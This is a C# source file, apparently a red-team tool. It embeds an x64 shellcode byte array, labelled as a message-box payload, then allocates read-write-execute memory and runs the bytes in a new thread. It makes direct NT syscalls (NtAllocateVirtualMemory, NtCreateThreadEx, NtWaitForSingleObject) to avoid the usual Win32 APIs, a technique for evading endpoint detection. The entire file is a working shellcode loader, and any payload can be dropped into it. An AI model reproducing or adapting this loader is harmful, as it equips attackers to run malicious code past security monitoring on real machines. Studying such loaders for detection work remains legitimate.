using System;
using System.Runtime.InteropServices;
using static Syscall.Native;
using static Syscall.Syscalls;

namespace Syscall
{
    class Program
    {
        static void Main()
        {
            /*   Messagebox shellcode   */
            byte[] payload = new byte[] { 0x48,0x31,0xc9,0x48,0x81,0xe9,0xc6,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff
,0xff,0xff,0x48,0xbb,0x7f,0xbd,0x43,0x48,0x09,0x7e,0x09,0xf2,0x48,0x31,0x58
,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x83,0xf5,0xc0,0xac,0xf9,0x96
,0xc9,0xf2,0x7f,0xbd,0x02,0x19,0x48,0x2e,0x5b,0xa3,0x29,0xf5,0x72,0x9a,0x6c
,0x36,0x82,0xa0,0x1f,0xf5,0xc8,0x1a,0x11,0x36,0x82,0xa0,0x5f,0xf5,0xc8,0x3a
,0x59,0x36,0x06,0x45,0x35,0xf7,0x0e,0x79,0xc0,0x36,0x38,0x32,0xd3,0x81,0x22
,0x34,0x0b,0x52,0x29,0xb3,0xbe,0x74,0x4e,0x09,0x08,0xbf,0xeb,0x1f,0x2d,0xfc
,0x12,0x00,0x82,0x2c,0x29,0x79,0x3d,0x81,0x0b,0x49,0xd9,0xf5,0x89,0x7a,0x7f
,0xbd,0x43,0x00,0x8c,0xbe,0x7d,0x95,0x37,0xbc,0x93,0x18,0x82,0x36,0x11,0xb6
,0xf4,0xfd,0x63,0x01,0x08,0xae,0xea,0xa4,0x37,0x42,0x8a,0x09,0x82,0x4a,0x81
,0xba,0x7e,0x6b,0x0e,0x79,0xc0,0x36,0x38,0x32,0xd3,0xfc,0x82,0x81,0x04,0x3f
,0x08,0x33,0x47,0x5d,0x36,0xb9,0x45,0x7d,0x45,0xd6,0x77,0xf8,0x7a,0x99,0x7c
,0xa6,0x51,0xb6,0xf4,0xfd,0x67,0x01,0x08,0xae,0x6f,0xb3,0xf4,0xb1,0x0b,0x0c
,0x82,0x3e,0x15,0xbb,0x7e,0x6d,0x02,0xc3,0x0d,0xf6,0x41,0xf3,0xaf,0xfc,0x1b
,0x09,0x51,0x20,0x50,0xa8,0x3e,0xe5,0x02,0x11,0x48,0x24,0x41,0x71,0x93,0x9d
,0x02,0x1a,0xf6,0x9e,0x51,0xb3,0x26,0xe7,0x0b,0xc3,0x1b,0x97,0x5e,0x0d,0x80
,0x42,0x1e,0x01,0xb7,0x09,0x7a,0xc0,0x20,0x8e,0x71,0x48,0x09,0x3f,0x5f,0xbb
,0xf6,0x5b,0x0b,0xc9,0xe5,0xde,0x08,0xf2,0x7f,0xf4,0xca,0xad,0x40,0xc2,0x0b
,0xf2,0x6a,0x0e,0x83,0xe0,0x08,0x72,0x48,0xa6,0x36,0x34,0xa7,0x04,0x80,0x8f
,0x48,0x48,0x33,0xca,0x65,0x4f,0xf6,0xab,0x45,0x7b,0x95,0xd5,0x42,0x49,0x09
,0x7e,0x50,0xb3,0xc5,0x94,0xc3,0x23,0x09,0x81,0xdc,0xa2,0x2f,0xf0,0x72,0x81
,0x44,0x4f,0xc9,0xba,0x80,0x7d,0x0b,0xc1,0xcb,0x36,0xf6,0x32,0x37,0x34,0x82
,0x09,0xb3,0x94,0x06,0x2d,0x9f,0x42,0x96,0x00,0x80,0xb9,0x63,0xe2,0x3e,0xe5
,0x0f,0xc1,0xeb,0x36,0x80,0x0b,0x3e,0x07,0xda,0xed,0x7d,0x1f,0xf6,0x27,0x37
,0x3c,0x87,0x08,0x0b,0x7e,0x09,0xbb,0xc7,0xde,0x2e,0x2c,0x09,0x7e,0x09,0xf2
,0x7f,0xfc,0x13,0x09,0x59,0x36,0x80,0x10,0x28,0xea,0x14,0x05,0x38,0xbe,0x63
,0xff,0x26,0xfc,0x13,0xaa,0xf5,0x18,0xce,0xb6,0x5b,0xe9,0x42,0x49,0x41,0xf3
,0x4d,0xd6,0x67,0x7b,0x43,0x20,0x41,0xf7,0xef,0xa4,0x2f,0xfc,0x13,0x09,0x59
,0x3f,0x59,0xbb,0x80,0x7d,0x02,0x18,0x40,0x81,0xc1,0xbf,0xf6,0x7c,0x0f,0xc1
,0xc8,0x3f,0xb3,0x8b,0xb3,0x82,0xc5,0xb7,0xdc,0x36,0x38,0x20,0x37,0x42,0x89
,0xc3,0x07,0x3f,0xb3,0xfa,0xf8,0xa0,0x23,0xb7,0xdc,0xc5,0xf9,0x47,0xdd,0xeb
,0x02,0xf2,0xaf,0xeb,0xb4,0x6f,0x80,0x68,0x0b,0xcb,0xcd,0x56,0x35,0xf4,0x03
,0xb7,0xc3,0xb3,0xe9,0x0b,0x0c,0x49,0x38,0xae,0x31,0x27,0x63,0x7e,0x50,0xb3
,0xf6,0x67,0xbc,0x9d,0x09,0x7e,0x09,0xf2 };

            IntPtr hCurrentProcess = GetCurrentProcess();
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length)); // needs to be passed as ref
            uint allocationType = (uint)Native.AllocationType.Commit | (uint)Native.AllocationType.Reserve; // reserve and commit memory
            uint protection = (uint) Native.AllocationProtect.PAGE_EXECUTE_READWRITE; // set the memory protection to RWX, not suspicious at all...

            /*   Allocate memory for shellcode via syscall (alternative to VirtualAlloc Win32 API)   */
            try
            {
                var ntAllocResult = NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
                Console.WriteLine($"[*] Result of NtAllocateVirtualMemory is {ntAllocResult}");
                Console.WriteLine("[*] Address of memory allocation is " + string.Format("{0:X}", pMemoryAllocation));
            }
            catch
            {
                Console.WriteLine("[*] NtAllocateVirtualMemory failed.");
                Environment.Exit(1);
            }

            /*   Copy shellcode to memory allocated by NtAllocateVirtualMemory   */
            try
            {
                Marshal.Copy(payload, 0, (IntPtr)(pMemoryAllocation), payload.Length);
            }
            catch 
            { 
                Console.WriteLine("[*] Marshal.Copy failed!"); 
                Environment.Exit(1); 
            }

            IntPtr hThread = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            /*   Create a new thread to run the shellcode (alternative to CreateThread Win32 API)   */
            try
            {
                var hThreadResult = NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
                Console.WriteLine($"[*] Result of NtCreateThreadEx is {hThreadResult}");
                Console.WriteLine($"[*] Thread handle returned is {hThread}");
            }
            catch
            {
                Console.WriteLine("[*] NtCreateThread failed.");
            }

            /*   Wait for the thread to start (alternative to WaitForSingleObject Win32 API)   */

            try
            {
                var result = NtWaitForSingleObject(hThread, true, 0); // alertable or not alertable, no change...
                Console.WriteLine($"[*] Result of NtWaitForSingleObject is {result}");
            }
            catch
            {
                Console.WriteLine("[*] NtWaitForSingleObject failed.");
                Environment.Exit(1);
            }

            return;
        }
    }
}
